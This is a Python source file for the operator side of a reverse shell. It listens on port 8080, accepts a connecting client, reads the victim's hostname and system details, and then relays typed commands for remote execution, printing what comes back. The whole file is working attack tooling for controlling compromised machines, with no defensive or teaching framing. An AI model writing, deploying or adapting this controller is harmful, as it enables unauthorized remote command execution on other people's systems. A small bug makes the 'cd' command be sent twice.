import socket
import sys
import time
from colorama import Fore, Back, Style

# ASCII art for decoration
ascii_art = '''
                                                                                
                                                        ,,                      
`7MMF' `YMM'          mm                                db                      
  MM   .M'            MM                                                        
  MM .d"     .gP"Ya mmMMmm  ,6"Yb.  `7MMpMMMb.pMMMb.  `7MM  `7MMpMMMb.  .gP"Ya  
  MMMMM.    ,M'   Yb  MM   8)   MM    MM    MM    MM    MM    MM    MM ,M'   Yb 
  MM  VMA   8M""""""  MM    ,pm9MM    MM    MM    MM    MM    MM    MM 8M"""""" 
  MM   `MM. YM.    ,  MM   8M   MM    MM    MM    MM    MM    MM    MM YM.    , 
.JMML.   MMb.`Mbmmd'  `Mbmo`Moo9^Yo..JMML  JMML  JMML..JMML..JMML  JMML.`Mbmmd' 
                                                                                
'''

# Help message
help_message = '''
Available commands:
  - Type commands directly to execute on the client.
  - Type "cd <directory>" to change directory on the client.
  - Type "WQ" to close the connection.
'''

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server_ip = '0.0.0.0'
server_port = 8080

identifier = '<END_OF_COMMAND_OUTPUT>'

try:
    server_address = (server_ip, server_port)
    server_socket.bind(server_address)

    server_socket.listen(5)

    print(ascii_art)  # Display ASCII art
    print(f'[{time.asctime()}] [{Fore.YELLOW}?{Style.RESET_ALL}] Listening for incoming client(s) on {Fore.YELLOW}{server_ip}{Style.RESET_ALL}:{Fore.YELLOW}{server_port}{Style.RESET_ALL}...') #ADD TIMESTAMP
    server_socket, client_address = server_socket.accept()
except Exception as e:
    print(f'[{time.asctime()}] [{Fore.RED}!{Style.RESET_ALL}] Error. {Fore.RED}{e}{Style.RESET_ALL}') #ADD TIMESTAMP
    sys.exit()
except KeyboardInterrupt:
    sys.exit()
else:
    client_info = server_socket.recv(1024).decode()
    client_hostname = client_info[client_info.index('Hostname:') + len('Hostname:'):client_info.index('Version')].strip()

    print(f'[{time.asctime()}] [{Fore.GREEN}+{Style.RESET_ALL}] Connection with {Fore.GREEN}{client_address}{Style.RESET_ALL} was successfully established.\n{Fore.GREEN}{client_info}{Style.RESET_ALL}') #ADD TIMESTAMP

try:
    while True:
        command = input(f'{client_address} : {client_hostname} > ')

        if command == '-h':
            print(help_message)
            continue
        
        server_socket.send(command.encode())

        if command.upper() == 'WQ':
            server_socket.close()
            print(f'[{time.asctime()}] [{Fore.GREEN}+{Style.RESET_ALL}] Socket closed.')
            break
        elif command == '':
            continue
        elif command.startswith('cd'):
            server_socket.send(command.encode())
            continue
        else:
            full_command_output = b''
            while True:
                chunk = server_socket.recv(1024)
                if chunk.endswith(identifier.encode()):
                    chunk = chunk[:-len(identifier)]
                    full_command_output += chunk
                    break
                full_command_output += chunk
            print(f'{Fore.GREEN}{full_command_output.decode()}{Style.RESET_ALL}')

except Exception as e:
    print(f'[{time.asctime()}] [{Fore.RED}!{Style.RESET_ALL}] Error occurred. {Fore.RED}{e}{Style.RESET_ALL}\nSocket was closed.') #ADD TIMESTAMP
    server_socket.close()
except KeyboardInterrupt:
    server_socket.close()
    sys.exit('Exit')
